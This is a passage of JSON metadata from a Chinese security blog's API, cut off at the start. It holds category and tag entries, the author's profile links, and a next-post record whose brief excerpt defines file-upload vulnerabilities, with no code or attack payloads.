mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":2,"path":"api/tags/SQL注入.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"浅析文件上传","uid":"59889abed1e0595b2f38848b74044672","slug":"浅析文件上传","date":"2022-06-18T09:25:28.000Z","updated":"2024-02-14T07:53:20.000Z","comments":true,"path":"api/articles/浅析文件上传.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553540.png","text":"前言文件上传与文件包含这种漏洞都是比较常见的漏洞，在学习过后对其进行简单总结，希望能对正在学习此部分的师傅们有一些帮助。 漏洞相关信息漏洞定义文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”...","link":"","photos":[],"count_time":{"symbolsCount":"10k","symbolsTime":"9 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"文件上传","slug":"文件上传","count":1,"path":"api/tags/文件上传.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}